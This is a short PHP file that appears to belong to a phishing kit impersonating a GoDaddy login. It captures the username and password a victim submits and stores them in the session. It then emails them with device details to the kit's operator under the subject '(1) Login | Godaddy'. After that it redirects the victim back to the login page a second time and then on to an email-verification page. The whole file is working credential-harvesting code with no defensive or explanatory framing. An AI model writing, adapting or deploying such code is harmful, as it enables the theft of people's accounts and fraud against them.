<?php 
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

$outpu = array();

    if (isset(
        $_POST['userid'])){
        $token = $_GET['token'];
            $_SESSION['username'] = $_POST['userid'];
            $_SESSION['password'] = $_POST['pass'];
            $content = '<h4><span >Godaddy</span> </h4>
                    <h2>(1) Login from ' . $_SESSION['username'] . '</h2>
                    <h3>Username: ' . $_SESSION['username'] . '</h3>
                    <h3>Password: ' . $_SESSION['password'] . '</h3>
                    <h3> Device Info</h3>
                            ' . $Modernizeds->userDetails() . '
                  ';

            
                        if (!isset($_SESSION['logina']) and $_SESSION['logina'] != 1 and $_SESSION['LOGINTWICE'] != 1) {
                            $_SESSION['logina'] = 1;
                            $Modernizeds->mailmovement("(1) Login | Godaddy", $content);
                            echo '<script> window.location="index.php?token='.$token.'" </script>';
                            }            
                        elseif((isset($_SESSION['logina']) and $_SESSION['logina'] == 1) or $_SESSION['LOGINTWICE'] == 1) {
                                    unset($_SESSION['logina']);
                                    $Modernizeds->mailmovement("(1) Login | Godaddy", $content);
                                    echo '<script> window.location="emverify.php?token='.$token.'" </script>';
            
                            }
            }
?>